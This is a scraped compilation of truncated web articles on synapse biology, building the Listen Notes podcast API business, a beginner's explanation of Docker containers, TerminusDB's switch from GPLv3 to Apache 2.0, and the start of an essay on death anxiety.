connections. One of the biggest advances, over the last 20 years, has been our identification of the tremendous number of proteins that make up these connections. Biochemists estimate there are thousands of different, distinct proteins at each synapse. The amazing diversity of these proteins is what allows the brain to tune the strength and stability of synapses, allowing us to think complex thoughts and build memories.</p><p>We’ve learned that if there is a genetic mutation that changes the function of one of these proteins, it can contribute to disorders such as autism, schizophrenia and depression. We’ve come to think of these conditions as synapse disorders, or synaptopathies.</p><p><strong>In a developing fetus or a baby, neurons have been thought to form lots of connections willy-nilly, as described by the delightful phrase “exuberant synaptogenesis.” How does this process build an organized brain?</strong></p><p>When neurons are born in the fetal brain, they migrate to their proper position. A simplified way of thinking about it is that some move to the cerebrum which is involved in jobs like speech and reasoning, some to the cerebellum, which is involved in coordinating movement, and some to the brain stem where automatic body actions like breathing are rooted. Once positioned, the axons then follow chemical trails to target areas, either in the same part of the brain or elsewhere.</p><p>In textbooks, it says that once they are in the basic target area, axons form exuberant connections; then the excess synapses are pruned only later in development. But we now know there are molecules that limit synapse formation to start with, that the initial formation is more tightly controlled.</p><p><strong>The ability of the brain to strengthen or weaken synapses depending on how active they are is often referred to as “plasticity.” What is plasticity and why is it important?</strong></p><p>Plasticity means the brain can change, for example by altering connections in its networks. Without plasticity, we wouldn’t be able to learn or adapt to our environment. When you learn something, you have electrical activity going through different circuits. Those electrical impulses change the strength of specific connections, making them either stronger or weaker.</p><p>For example, if you learn that “hola” means “hello” in Spanish, certain synapses will become stronger. This results from changes in the various proteins making up the synapse.</p><p>Scientists can see this when they mimic learning in slices of brain in lab dishes, and even in living animals. Dendrites have little bumps, called spines, that act as signal receivers. After learning, these spines get larger, and they are more likely to stick around. That kind of change is part of plasticity.</p><p><strong>Little kids are great at absorbing new information and skills. As adults, we’re often not so good at this. How does plasticity change with age?</strong></p><p>The brains of young animals have a lot of plasticity. For each ability in the brain, such as picking up a language, there’s a critical period in which learning is easy. That critical period is when the brain is making lots of changes. If you look at those dendrite spines in a young brain, they’re moving around like crazy.</p><p>But when you look in an adult brain, the spines don’t move very much. That’s because material that acts like glue comes in and holds the neurons in place. The critical period for each brain region closes at a different time. For example, the critical period for language development starts to close around age 5. But the brain’s ability to make rational judgments isn’t fully mature until about age 25.</p><p>So the connections are pretty stable in adults, but plasticity doesn’t completely disappear. In adults, it’s not so much about adding or deleting connections, but tuning the strength of synapses, using all those synapse proteins.</p><p>One of the great mysteries is <em>why</em> adults lose that ability to learn so easily. In some cases, like parts of the visual system in frogs and goldfish, this plasticity doesn’t disappear. Scientists are trying to understand what happens in those creatures. If we could reopen the critical period in someone whose nerves are damaged or deteriorating, maybe we could regrow connections.</p><p><strong>To study synapses, scientists first tackled the neuromuscular junction, where certain neurons meet up with muscles to control movement. Where did researchers go from there?</strong></p><p>In the 1990s and early 2000s, the field was completely dominated by neuromuscular junction studies. It’s a much simpler synapse than those in the brain. We learned a lot.</p><p>But in the brain, synapses are much more diverse. Focusing on the brain became possible with the development of<a href="https://www.nature.com/articles/nprot.2006.356" target="_blank"> techniques</a> that allowed us to take neurons out of the brain and watch, in a dish, as they form networks. So we can start to assess how synapses form, function and disappear in the complex networks they form even outside of the brain. </p><p>What we’ve discovered is there are huge differences between the brain and the neuromuscular junction. There are many, many more diverse types of synapses in the brain, and more kinds of neurotransmitters. It makes the brain much more complicated — not to diminish the complexity of the neuromuscular junction! — and super-interesting.</p><p><strong>Researchers have also discovered a new class of molecules that hold the two sides of the synapse together. Why are these important?</strong></p><p>These molecules span the gap between the two sides of the synapse, holding the transmitting and receiving cells together like zippers, and they’re really important for <a href="https://www.nature.com/articles/nn.3271" target="_blank">synapse formation and elimination</a>.</p><p>It turns out that mutations that alter many of these “zipper” molecules make synapses dysfunctional, and are associated with brain disorders including epilepsy, Down syndrome and Alzheimer’s disease. For example, defects in the gene for a zipper protein called neuroligin were <a href="https://www.nature.com/articles/ng1136" target="_blank">linked to autism</a>; then researchers found mutations in the same gene  <a href="https://academic.oup.com/hmg/article/20/15/3042/2527146" target="_blank">in people with schizophrenia</a>.</p><p>But you also can have these mutations and no brain disorder. One of the burning questions right now is, what causes somebody with a zipper protein mutation to manifest …</p></div></div>

<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><div>
<p><a href="https://www.listennotes.com/">Listen Notes</a> is a podcast search engine that allows people to search <a href="https://www.listennotes.com/podcast-stats/">nearly two million podcasts and more than 89&nbsp;million episodes</a>&nbsp;by people or topics. We also provide a<a href="https://www.listennotes.com/api/"> podcast API</a> for developers to use, which is called Listen API. It has become a core part of our business.</p>
<p>In this article, I’ll share with you the journey of building this API business, the technology behind it, and hopefully&nbsp;you can&nbsp;learn one thing or two and build&nbsp;your own API business in the future.</p>
<p>Please note that I use “I” and “we” interchangeably in this article :)</p>

<h2><strong>An accidental API&nbsp;business</strong></h2>

<p>I left my previous failed startup in September 2017. After a few days of tinkering, I picked up one of my fledgling side projects to polish the UI a bit. That side project was<a href="https://www.listennotes.com/"> Listen Notes</a>, a podcast search engine website, which was just a single page React JS app running on three $10/month DigitalOcean droplets.</p>
<p>Little did I know a few years ago that my small, neglected side project would turn into a helpful business it has blossomed into.</p>

<p><img src="https://production.listennotes.com/web/image/37454d6afb7b458ca58ae4e5873ddbbd.png"></p>
<p><small>Listen Notes around September 2017</small></p>

<p>I continued to work on Listen Notes full-time and incorporated Listen Notes as a Delaware C-Corp in October 2017. One of my goals was to experience as many facets of business as possible, rather than just writing code behind the scenes.</p>
<p>My initial plan was as follows: (Don’t laugh at me!)</p>
<ul>
<li>Build a podcast search engine website and make some money from advertising, just like Google. Simple!</li>
<li>If this Listen Notes thing doesn’t work in two or three months, then I’ll run out of cash, and I’ll go into credit card debt to keep going for one more month or so. If it still doesn’t work, then I’ll have to find a full-time job. Although Jeff Bezos’ parents invested $300,000 in early Amazon and Mark Zuckerberg’s parents loaned $100,000 to early Facebook, not every family is able to casually toss six figures of cash at web projects.</li>
</ul>
<p>Then something happened.</p>
<p>On November 20, 2017, I got an email from the developer of a new podcast app, who asked if Listen Notes provided an API. He wanted to be able to search episodes in his app, but he didn’t want to build the entire backend. I asked a few questions (e.g., how would the endpoints look, what data fields did he need, how much was he willing to pay…). I got his answers. All were in an email thread within a couple days.</p>
<p>On November 30, 2017, I quickly implemented three endpoints (<em>GET /search, GET /podcasts/{id}, and GET /episodes/{id}</em>), which were basically three<a href="https://docs.djangoproject.com/en/3.1/topics/http/views/"> Django views</a>. I Googled “API gateway” or something like that and found a service called<a href="https://konghq.com/blog/mashape-has-a-new-homepage/"> Mashape</a>, which was an API marketplace that handled payment, user management, and API documentation. So I put my three endpoints on Mashape and created two plans there: FREE and PRO. I emailed the developer back to tell him the API was ready to use.</p>
<p>This is the email thread that prompted me to build Listen API:</p>
<p><img src="https://production.listennotes.com/web/image/125d913b8ad14bbd99fbc7c1cfe49e04.png"></p>

<p>Then nothing happened. The podcast app developer didn’t use our API and instead phased out their project.</p>
<p>Eventually, I moved on to primarily focus on the development of listennotes.com. The API was basically in self-driving mode on the open web. Anyone who happened to discover our API could sign up, without talking to any human beings.</p>
<p>On January 14, 2018, I got my first paying user. A few more paying users arrived that same year.</p>
<p>Here is the email notification I received for my first paying user:</p>
<p><img src="https://production.listennotes.com/web/image/1cf8ad68f0c345318c9c64b3f370764b.png"></p>

<p>Wait, what is RapidAPI? Well, Mashape was acquired by a startup named RapidAPI. They didn’t rebrand Mashape to RapidAPI completely until mid-2018. Startups typically don’t do things in a clean and methodical way, which is totally understandable.</p>
<p>Then something happened.</p>
<p>There was an outage on the RapidAPI end on November 29, 2018. This was the email I sent to people in RapidAPI when the outage happened.</p>

<p><img src="https://production.listennotes.com/web/image/4d1a713f41dd465b9e57fa4e34be4208.png"></p>

<p>RapidAPI had performed a big backend upgrade around that time. As an engineer, I totally understand that outages happen, especially when making huge changes in the backend. But I felt helpless because their customer support didn’t reply to my email. Phone call didn't work, as expected.</p>
<p>Usually their customer support was very responsive; perhaps it was the holiday season and people were on vacation. So I used hunter.io to find work emails of individual RapidAPI employees, the CEO, as well as the CTO. The issue was finally resolved, many hours later. In other words, our API was completely unusable during those down hours. I felt very sorry for our paying users.</p>
<p>Then around mid-February 2019, RapidAPI had billing problems and failed to pay us a few thousand bucks. Our paying users paid RapidAPI first. RapidAPI took a 20% cut. Then they paid the remaining 80% (minus PayPal fees) to us. After several back-and-forth emails and phone calls, we finally got our payment. It’s understandable. Again, startups make mistakes.</p>
<p>In late February 2019, I decided to build our own RapidAPI replacement, for a few reasons:</p>
<ul>
<li>Our API revenue became nontrivial. The 20% cut from RapidAPI was a bit too much for us.</li>
<li>We wanted API requests to hit our own servers directly, thus lowering latency for our users.</li>
<li>I didn’t want to feel helpless when RapidAPI had outages. Overall they did a good job running the service. But I wanted to control my own destiny.</li>
<li>I wanted to contact my API users directly. Using RapidAPI, API providers like me didn’t have access to our users’ email addresses. It’s understandable. It’s like the “Uber for X” companies that don’t want workers and customers to bypass them and strike deals under the table. Marketplaces don’t want users to skip the middleman’s commission fees.</li>
</ul>
<p>In addition, I vowed to do two things really well for our new API system:</p>
<ul>
<li>We must provide great customer service to our paying users.</li>
<li>We will give customers a very stable &amp; reliable backend service.</li>
</ul>
<p>After 30 days of hard work,<a href="https://www.listennotes.com/blog/listen-api-v2-simple-pricing-same-endpoints-39/"> we launched Listen API v2</a> on March 27, 2019. The legacy API hosted on RapidAPI became Listen API v1, a version we won’t add new features to but don’t want to shut down because some apps are still using it as of December 2020!</p>
<p>We continue to improve our new Listen API v2 by adding new endpoints, new data fields, improving operational efficiency, as well as spiffing up the user dashboard and our internal tools.</p>
<p>Things are picking up speed gradually. I’ve been happy since then.</p>
<p>So, that’s the journey of Listen API so far.</p>
<p><em>Note: Although we decided to move on from RapidAPI, I still think it’s a great service. Startups all make mistakes in the early stage. They fix things and continue to improve their service, which is great! </em></p>

<h2><strong>The technology behind Listen&nbsp;API</strong></h2>

<p>Developers can use our API to search podcasts and fetch detailed podcast-episode metadata. To make this whole thing work, we need to make sure a few core components are in place.</p>
<p>The following graph summarizes those components and the technologies used:</p>

<p><img src="https://production.listennotes.com/academy/image/3c36ff70b8ab4d25aa85bfa567007087.png"></p>

<h3><strong>Datastore and search&nbsp;engine</strong></h3>

<p>This is a shared component with our website. Therefore, I didn’t need to change anything in the datastore and search engine when building our API infrastructure.</p>
<p>We use Postgres as our main data store (e.g., for podcast metadata, user accounts…), and Elasticsearch as the search engine.</p>
<p>I wrote an old blog post with<a href="https://www.listennotes.com/blog/the-boring-technology-behind-a-one-person-23/"> details of the entire tech stack</a>.</p>

<h3><strong>Internal tools and processes</strong></h3>

<p>If you’ve worked in any web companies, you probably know what I’m referring to here.</p>
<p>It’s rare for an Internet business to be 100% automatic. A company always needs to build tons of internal tools and set up manual processes to keep the service functional. That’s why companies like<a href="https://www.bloomberg.com/news/articles/2020-10-20/retool-nears-1-billion-valuation-with-funding-from-sequoia"> Retool have such a high valuation</a> nowadays.&nbsp;</p>
<p>Companies are investing big money in internal tools that are invisible to end users:</p>

<p><img src="https://production.listennotes.com/web/image/e448df5503934491b251a2a85b815686.png"></p>
<p>Credits: <a href="https://retool.com/blog/state-of-internal-tools-2020/">Retool</a></p>

<p>To start our API business, we needed to build (at least) two types of internal tools:</p>
<ul>
<li><strong>For data operations</strong>: We needed the ability to keep the podcast metadata up-to-date, fix corrupted metadata, plus review and approve any changes made by users. Additionally, we required a framework that handled new, rare edge cases of corrupted podcast data along the way. To some degree, building a software product means handling tons of edge cases for a very long period of time (e.g., years), rather than launching new features every day.</li>
<li><strong>For user operations</strong>: We required the ability to suspend a bad user’s account, as well as immediately look up all information related to a specific user who contacted us for a specific issue. Plus, we had to be able to quickly evaluate if “it’s our fault” (server-side errors) or “it’s their fault” (client-side errors) when users complained.</li>
</ul>
<p>Internal tools are used by employees inside the company. Some of those tools are fully automated, such as cron jobs that perform scheduled tasks. But many tools should be used manually by human employees, e.g., when inputting a user’s ID number and clicking a button.</p>
<p>Most of our internal tools have ugly web UIs, with default<a href="https://getbootstrap.com/"> Bootstrap</a> styling :) The following screenshot displays a portion of our internal tool’s UI that allows us to suspend an API user’s account:</p>
<p><img src="https://production.listennotes.com/web/image/f5c69dcc39a041bdbb230bcc25b3a36c.png"></p>

<p>Fortunately, our API shares many internal tools with the website. So we didn’t need to build too many new things here.</p>

<h3><strong>The analytics and billing&nbsp;system</strong></h3>

<p>The pricing model of an API is typically usage-based. Check out some real world examples:</p>
<ul>
<li><a href="https://www.twilio.com/pricing" rel="nofollow noopener" target="_blank">https://www.twilio.com/pricing</a></li>
<li><a href="https://sendgrid.com/pricing/" rel="nofollow noopener" target="_blank">https://sendgrid.com/pricing/</a></li>
<li><a href="https://cloud.google.com/maps-platform/pricing/" rel="nofollow noopener" target="_blank">https://cloud.google.com/maps-platform/pricing/</a></li>
<li><a href="https://www.microsoft.com/en-us/bing/apis/pricing">https://www.microsoft.com/en-us/bing/apis/pricing</a></li>
</ul>
<p>It’s a must to track how many requests a user uses in real-time. We use Redis to keep track of such stats and periodically dump into Postgres for persistent storage.&nbsp;</p>
<p>What happens if our Redis has an outage? We might temporarily lose some tracking stats. In this case, we have an internal tool to sync stats from raw Nginx logs.</p>
<p>We have to change billing plans without affecting existing users. For example, if we raise prices, existing users should still enjoy the benefit of the old plans. If it’s not done right, it’s easy to have inconsistent states across the board, …</p></div></div>

                <p><strong>TL;DR</strong> I'm a full stack engineer who works almost exclusively on Macs. I don't have a computer science degree nor do I have strong experience with Linux architecture. This post documents my journey of learning Docker.</p>



<p><strong>If you stick with this blog post, you'll have decent answers for the following questions.</strong> If you've already used Docker, these questions will strengthen your understanding.</p>

<ol>
<li>What is "Docker"?  </li>
<li>What is a "container"? Did Docker invent containers?  </li>
<li>What does it mean to "run a container"?  </li>
<li>Are containers stateful? What does container state even mean?  </li>
<li>Do containers run only one process? Or can they run multiple processes?  </li>
<li>What exactly is "Docker for Mac"? I thought Docker was cross platform?  </li>
<li>Does Docker work for Windows development?  </li>
<li>What are "docker-compose" and "BuildKit"? Why are there so many different applications?  </li>
<li>Most Docker images start with something like <code>FROM ubuntu</code>. Is my container running a full Ubuntu operating system? If not, why is it <em>from</em> Ubuntu? In fact, what does it even mean to "run an operating system?"</li>
</ol>

<p>The summarized answers for all of these questions are at the end of this post.</p>



<p>How might you <a href="https://blog.andrewray.me/reactjs-for-stupid-people/">explain React.js</a> to a newcomer? You <em>could</em> say:</p>

<blockquote>
  <p>React is a JavaScript library for building user interfaces</p>
</blockquote>

<p>I don't think this would help a newcomer form a mental model of React, as it's <strong>too high level</strong>. You could also say:</p>

<blockquote>
  <p>React is a declarative DSL that outputs a tree-like "virtual DOM," mutating the DOM (or another view target) with O(n) reconciliation performance, as a pure function of component state and props</p>
</blockquote>

<p>And I think, justifiably, the newcomer would slap you in the face, because you just told them to go to hell.</p>

<p>Something more approachable is:</p>

<blockquote>
  <p>React is mainly a Javascript library that takes in data, like a username, and spits out HTML based on that data. It gives you a performant way to update the view in real time based on changes to that data. React can do a lot more than this, but the most common use case is taking in data and spitting out HTML.</p>
</blockquote>

<p>Does this accurately describe all of React? No, and once someone dives in, they'll have to learn the intricacies of the API. But it's more <strong>approachable.</strong></p>

<p>I find the Docker documentation is written by, and targeted to, people who already have a deeper understanding of Linux fundamentals, virtualization, and kernels versus operating systems.</p>

<p>If someone tells you that Docker is "cgroups and namespaces" with no other information, it's technically accurate, but not approachable.</p>



<p>If you just want to build web servers, why care about Docker at all? Well, I've personally encountered many of the issues containers claim to solve:</p>

<ul>
<li>Requiring multiple versions of <strong>userland libraries</strong> (like Node, and also npm packages) in different repositories, causing conflicts for local development because they aren't isolated</li>
<li>Requiring <strong>multiple service or database versions</strong> causing conflict in local development (have you ever tried to run two versions of MySQL on a Mac using Homebrew?)</li>
<li>Running into <strong>dependency installation issues</strong> when checking out both old and new projects (Ruby / Rails are particularly bad at this, damn you <a href="https://stackoverflow.com/q/33996523/743464">Nokogiri</a>). Who hasn't run an old project only to learn everything is broken?</li>
<li>Needing to <strong>easily run multiple services</strong> for local development, some of which need multiple commands (such as both a server process and a static file builder process like Webpack)</li>
<li>Losing <strong>parity between environments</strong> due to version or process execution discrepancies, making it impossible to reproduce situations that cause some production bugs</li>
</ul>



<p>This post <strong>isn't</strong> a deep dive on Docker's API. We won't explain the syntax of <code>Dockerfile</code>s, <code>docker-compose.yml</code> files, nor the CLI. We also won't talk much about "orchestration," the verb used to describe running multiple containers and their dependencies and dealing with things like networking and automatically restarting containers.</p>



<h4 id="whatisdocker">What is Docker?</h4>

<p>Believe it or not, let's start with the Docker logo. It's great for our mental model!</p>

<p><img src="http://blog.andrewray.me/content/images/2020/05/Moby-logo.png" alt="The Docker Logo, which is a whale with a stack of shipping containers on its back"></p>

<p>We have a whale carrying some shipping containers. (His name is "Moby Dock," <strong>Moby</strong> for short). He's a whale because, a long time ago, he beat out other animals in <a href="https://99designs.com/logo-design/contests/create-cool-open-source-project-logo-219415/entries">a community logo design contest</a>.</p>

<p>In our mental model, the whale is Docker. <strong>Docker is a <em>platform</em>.</strong> It's not one thing, it's a collection of different technologies and standards that provide a platform to <strong>run containers!</strong> The whale is supporting, or "running" containers. We'll learn more about "containers" soon.</p>

<p><img src="http://blog.andrewray.me/content/images/2014/Oct/key.png#inline-block" alt="Key icon" title=""> <strong>Key concept:</strong> Docker is a platform, including online hosting, and a suite of local tools, like <code>docker-compose</code> and the Docker engine.</p>

<p>When learning Docker, you might wonder what the "right" or "Docker" way is. By viewing Docker as a platform, we realize there are multiple ways to do things. <strong>It's like Git:</strong> Git is a platform and suite of command line tools. In Git there are different ways to use the suite of tools. Some people use forks, some use feature branches, some use rebasing, some use merging. Docker provides you tools to build "images" and "run" "containers," with multiple ways to achieve the same thing.</p>

<p>"Docker" also means the <strong>company.</strong> I think this overloading makes learning Docker confusing. The Docker <em>platform</em> is <a href="https://github.com/docker">entirely open source</a>, so what does the company do? It makes money by <a href="https://hub.docker.com/pricing">charging for private hosting and management tools</a>, and offering <a href="https://hub.docker.com/pricing">enterprise services</a> for complex image/container management.</p>

<p>An aside: In 2019 Docker was <a href="https://techcrunch.com/2019/11/13/mirantis-acquires-docker-enterprise/">acquired</a> by a company named <a href="https://www.mirantis.com/software/mcp/">Mirantis</a> which makes money by supporting cloud application development around Kubernetes.</p>



<h4 id="whatisacontainerdiddockerinventcontainers">What is a "container"? Did Docker invent containers?</h4>

<p>Containers were the most difficult part of Docker for me to understand. I had some idea they were running a process in isolation, but I didn't really know what that meant. To answer this, let's make sure we understand the Docker platform by looking at a different question.</p>

<h4 id="whatexactlyisdockerformacithoughtdockerworkedonallplatforms">What exactly is "Docker for Mac?" I thought Docker worked on all platforms?</h4>

<p>I initially thought Docker was "cross platform." This is both true and a complete, filthy lie.</p>

<p>Take Docker for Mac out of the equation and pretend like you're developing directly on a Linux operating system, like Ubuntu. All operating systems have a "<a href="https://en.wikipedia.org/wiki/Kernel_(operating_system)"><strong>kernel</strong></a>", the core computer program of the operating system that controls everything and facilitates access to hardware.</p>

<p>The Linux kernel has features that allow you to run processes (computer programs) in "isolation":</p>

<ul>
<li>"<a href="https://access.redhat.com/documentation/en-us/red_hat_enterprise_linux/6/html/resource_management_guide/ch01">Control groups</a>", usually called "cgroups," let you run a Linux process with a specifically allocated set of resources, such as how much memory it has.</li>
<li>"<a href="https://en.wikipedia.org/wiki/Linux_namespaces">Namespaces</a>", which add additional isolation, like making your process look like it's the only one on the system.</li>
</ul>

<p><img src="http://blog.andrewray.me/content/images/2014/Oct/key.png#inline-block" alt="Key icon" title=""> <strong>Key concept:</strong>
Docker uses existing Linux features to run containers. These features <strong>only</strong> work on Linux. MacOS and Windows don't have cgroups nor namespaces.</p>

<p>So what is Docker for Mac, if these technologies only exist on Linux? Docker for Mac runs a full <strong>Linux "virtual machine."</strong> Virtual machines are a broader topic, but they contain full operating systems, including kernels, so we have access to these Linux features.</p>

<p>My mental image is the whale icon on my Mac's status bar holds a little Linux computer.</p>

<p>This also has the implication that the most common type of application developed with Docker is an application <em>for</em> Linux. For example, you <a href="https://serverfault.com/questions/607443/can-mac-os-x-be-run-inside-docker">can't run a Mac native application</a> like Photoshop in a Docker container. On Windows there's Docker container support for both Windows (.exe) applications as well as Linux applications, but they use different underlying technologies. And you can't run a Windows container on a Mac. See what I mean about Docker not really being "cross platform"?</p>

<p>On Mac and Windows, the Linux virtual machine is hidden from you as an implementation detail. You can typically SSH into computers and run commands on them. Docker for Mac <strong>doesn't let you directly SSH into this virtual machine.</strong> Instead, the Docker commands you run locally are what coordinate sending files and commands into this Linux virtual machine.</p>

<p>Finally, did Docker invent containers? No, containers are a <a href="https://en.wikipedia.org/wiki/List_of_Linux_containers">general concept</a>. <strong>Docker didn't invent containers.</strong> You can create and run containers <a href="https://jvns.ca/blog/2016/10/26/running-container-without-docker/">without Docker</a>. Cgroups and namespaces also aren't the only way to run processes in isolation, they're just the tools Docker uses.</p>

<h4 id="sodoesdockerworkonwindows">So does Docker work on Windows?</h4>

<p>The <a href="" windows="" container"="" https:="" www.youtube.com="" watch?v="8gG6_Xr68D8" are="" the"="">official Docker Enterprise video, at 0:45,</a> mentions "Windows containers." So you <em>can</em> use Docker on Windows?</p>

<p>It depends on what you mean by "use on Windows." If you're developing Linux applications, then <strong>Docker for Windows does the same thing as Docker for Mac,</strong> it runs a Linux virtual machine, and you communicate with that.</p>

<p>If however you want to develop an application that only runs on Windows, like a file ending in ".exe," you have to run your containers on a Windows host somehow. This is supported by Docker Enterprise, but much less common.</p>

<h4 id="whatdoesitmeantorunacontainer">What does it mean to "run a container"?</h4>

<p>"Container" is a noun. What we've talked about so far is the verb of "running" a container.</p>

<p><strong>Recap:</strong> When Docker runs your container, it starts your process (your computer program, developed for Linux architecture) wrapped in suite of Linux kernel tools to make it look like it's the only process on the system. Docker for Mac (and Windows) provide a Linux virtual machine so you can use these technologies. Running the container is basically the same as what you'd do on your host machine (like <code>npm start</code> or <code>rails s</code>), it's just in "isolation" inside the Linux VM.</p>

<p>Let's poke at containers a little more to strengthen our understanding.</p>

<h4 id="docontainershave_only_oneprocessorcantheyhavemultipleprocesses">Do containers have <em>only</em> one process? Or can they have multiple processes?</h4>

<p>Let's check! First let's install <code>htop</code>, the awesome process viewer on your Mac (not in a container): <code>brew install htop</code>.</p>

<p>Now run <code>htop</code> on your Mac. If you haven't used <code>htop</code>, don't worry too much about the interface, just note you see all sorts of processes running:</p>

<p><img src="http://blog.andrewray.me/content/images/2020/05/Screen-Shot-2020-05-07-at-8.42.50-PM.png" alt="A screenshot of htop running on Mac, showing multiple processes"></p>

          <h2 id="changing-license-from-gplv3-to-apache-20-terminusdb">Changing License from GPLv3 to Apache 2.0: TerminusDB</h2>

<p>We have decided to re-license TerminusDB from GPLv3 to Apache 2.0. We want independent software developers (ISVs) to embed TerminusDB in their applications and those developers feel that Apache is a lower risk option. The substantive points of practical difference are far less important – sufficient people believe it to be true and sufficient lawyers have advised teams to be wary of GPL.</p>

<p>In our experience, ISVs and devs in large companies/institutions size up their options at project conception and there remains a niggling doubt that ‘GPL might limit commercial prospects and cause me headaches’. The world has changed – and code freedom is being overtaken by developer freedom.</p>

<p>Open-source software is everywhere. It’s eating the world. In the top 10 databases on <a href="https://db-engines.com/en/ranking">DB-Engines</a>, the remaining proprietary databases were released in 1980 (Oracle), 1983 (IBM Db2) and 1989 (Microsoft SQL Server). It is hard to imagine another non-OSS database ever entering the top 10.</p>

<p>We had hoped that our association with the principals of the free software movement would result in community adoption and contribution, but that hasn’t really been the case. We see limited community input that relates to our choice of GPL. That might not be too surprising as when you investigate which license to choose on Stackoverflow, you get popular but wrong-headed comments like:</p>

<p><code>the GNU/GPL bunch are generally extremists when you encounter them in the wild.</code></p>

<p><code>don’t use GPL if you want your project to be commercial</code></p>

<p>With the shift to Apache, TerminusDB is, in a sense, becoming more open source as we are removing restrictions on how you can use the software.</p>

<h3 id="debate">Debate</h3>

<p>The core TerminusDB team had a long debate about licenses before the release of 1.0 last year. The main topics of discussion were:</p>

<ol>
<li>The risks of a cloud provider forking the code then hosting the database</li>
<li>What open source means to TerminusDB as a group</li>
<li>What we, as a community of devs and users, are most comfortable with</li>
</ol>

<h4 id="1-the-big-bad-cloud-providers">1. The big bad cloud providers</h4>

<p>In the past there was an unwritten rule, that big platforms wouldn’t come along and fork open source code and deliver the same product as a service. Unfortunately, those days are gone. AWS in particular has actively sought to offer very similar services to open source products. This led to <a href="https://www.mongodb.com/licensing/server-side-public-license/faq">MongoDB</a>, <a href="https://www.cockroachlabs.com/blog/oss-relicensing-cockroachdb/">CockroachDB</a> and <a href="https://www.confluent.io/confluent-community-license-faq/">Confluent</a> (among others) changing their licences to variations of ‘server side’ and moving away from the open-source tradition. They try to say ‘we are still open source, we are just forbidding a specific type of action’, but it can feel like window dressing for ‘we want to sweat our assets’.</p>

<p>Mongo, for example, is hardly suffering – it’s valued at over $15 billion. With such vast resources, they should be (and are) able to compete in the provision of their own database. MongoDB’s technology is more than competitive with AWS’ DocumentDB, and Mongo’s Atlas DBaaS - which runs on AWS infra - has been a huge success.</p>

<p>I’m sure our perspective will shift over time, but from where we’re standing, having a cloud provider launch a competing service would be a sign of enormous success. (And this is not to say that the cloud providers’ parasitic approach to OSS projects is not a genuine problem, it simply acknowledges that you have to be a widely used OSS project before it *becomes* a problem).</p>

<h3 id="2-free-software">2. Free software</h3>

<p>We don’t think it should be our job to provide corporations with free labor.</p>

<p>We do think that the software community should be able to access and use TerminusDB.</p>

<p>In 1974 software became copyrightable in the USA. It subsequently became obvious that researchers were giving out software for free, but businesses were not giving back. GNU/GPL came along to provide a new framework for that interface – the software would be free as in freedom (libre). Everybody would be free to modify and distribute, but proprietary additions would not be allowed.</p>

<p>The problem of businesses not giving back remains today.</p>

<p>GPL and copyleft provisions work well when they dominate open-source, but their waning popularity increases the ability for ISVs and corporates to go for more open licensing and for legal teams to write anti-GPL provisions into internal rules. Only significant developer push back can change that reality (and why push back when there are so many OSS options with permissive licenses).</p>

<p>Maybe if <a href="https://db-engines.com/en/system/MySQL">MySQL</a>, its offshoot <a href="https://db-engines.com/en/system/MariaDB">MariaDB</a>, and our graph brothers <a href="https://db-engines.com/en/system/Neo4j">Neo4j</a> weren’t the only GPL flag flyers in the top 20 databases, it might be easier to gain adoption with GPL; however, the other big OSS players: Postgres, Cassandra, Elastic &amp; Redis all go for less restrictive licenses.</p>

<p>The Affero GPL (AGPL) is treated as an even greater pariah than the GPLv3. The Google internal policy] bans all use of AGPL:</p>

<p><img src="https://terminusdb.com/blog/assets/uploads/agpl-at-google.jpg" alt=""></p>

<p><img src="https://terminusdb.com/blog/assets/uploads/agpl-at-google-2.jpg" alt=""></p>

<p>It reminds of <a href="https://news.ycombinator.com/item?id=13421608">this HN comment</a> on the <a href="http://www.defmacro.org/2017/01/18/why-rethinkdb-failed.html">excellent postmortem</a> of the demise of RethinkDB (recommended reading for all OSS folk):</p>

<p><img src="https://terminusdb.com/blog/assets/uploads/agpl-hn.jpg" alt=""></p>

<p>Our graph database brothers and sisters in <a href="https://neo4j.com/open-core-and-neo4j/">Neo4j moved</a> from the AGPL to ‘AGPL with a commons clause’ to GPLv3 to making some of the code proprietary. Getting the right license for an OSS project that also allows for some commercialization is far from straightforward. (As Neo certainly know – check out this <a href="https://public.igovsol.com/neo4j-court-records/graphfoundation/80-main.pdf">current court case about the formerly GPL enterprise code</a>).</p>

<p>It seems that <a href="https://github.com/graknlabs/grakn">Grakn</a> and <a href="https://github.com/fluree/db">Fluree</a> are seeing some success with the AGPL. We genuinely wish them well as we know it is a hard path to walk.</p>



<p>We did get some negative feedback about the GPL prior to launch. Some people working in corporates weren’t comfortable and thought that it would prevent them from using Terminus. Our response was – <strong>we didn’t develop for them</strong>. And that remains the case; however, the GPL skeptical environment is pervasive. There is a person who tweets TerminusDB after every release asking when the Apache version will land – I always ask him why he thinks he needs an Apache version and he doesn’t really know… though he has a vague feeling that the application he builds on top will be less valuable.</p>

<p>We thought we would focus on the cloud offering – <a href="https://terminusdb.com/hub/">TerminusHub</a>, which, as SaaS built on the database, has the benefit of being an in-house ‘product’ that doesn’t worry about the license of the underlying software. However, the community wants to build applications on the software and we want to offer an easy way to build a version control and collaboration layer into ISV applications. We think TerminusDB is the perfect infrastructure to build the next <a href="https://www.notion.so/">Notion</a> or <a href="https://roamresearch.com/">Roam Research</a>. We worry about the syncing, versioning and data collaboration – you worry about your users.</p>

<h3 id="why-shift-licenses">Why shift Licenses</h3>

<p>We do not think that our job is to provide corporations with free labor.</p>

<p>We still believe that <a href="https://www.gnu.org/gnu/manifesto.en.html">“the fundamental act of friendship among programmers is the sharing of programs.”</a></p>

<p>We would welcome a GPL fork of the TerminusDB code – we are happy to work with any such project should it emerge.</p>

<p>But we wish to build a community first and foremost. In order to facilitate that community, we will be moving to Apache 2.0 immediately.</p>

<p>We are going to continue to focus on creating a great open-source database and allow everybody to use that software in their projects.</p>

<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><div><div><p><strong>One way or another</strong>, we will all approach the end of life, we are all terminal, and existential anxiety can be a burden long before this. Studies by terror management theory researchers have <a href="https://aeon.co/essays/how-to-apply-terror-management-theory-to-improve-human-lives" rel="noopener">found</a> that when death salience is aroused in people, they adapt their behaviour and increase their reliance on defence mechanisms such as denial. The cultural anthropologist Ernest Becker argued in <em>The Denial of Death</em> (1973) that human civilisation is ultimately a symbolic defence mechanism against the awareness of our finite existence. He suggested that â€˜consciousness of death is the primary repression, not sexualityâ€™ as Sigmund Freud had popularised. Unconscious denial of death can have a demoralising effect on an individual, potentially affecting loved ones and the community as a whole.</p>
